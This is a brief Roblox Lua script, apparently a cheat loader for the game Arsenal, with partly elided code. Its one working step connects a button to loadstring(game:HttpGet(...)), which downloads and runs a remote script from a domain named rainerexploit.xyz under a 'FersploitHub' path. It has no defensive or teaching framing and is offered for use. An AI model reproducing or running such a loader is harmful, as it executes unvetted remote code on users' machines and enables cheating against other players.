--[[
	id: stcJ_9GYeHnMRbG1ew7HT
	name: Arsenal loader
	description: epico for sure
	time1: 2021-05-07 20:49:35.707079+00
	time2: 2021-05-07 20:49:35.707079+00
...
ui.TextButton.MouseButton1Down:Connect(
    function()
        ...
        loadstring(game:HttpGet("https://rainerexploit.xyz/FersploitHub/Arsenal.lua", true))() -- script here :D
    end
)
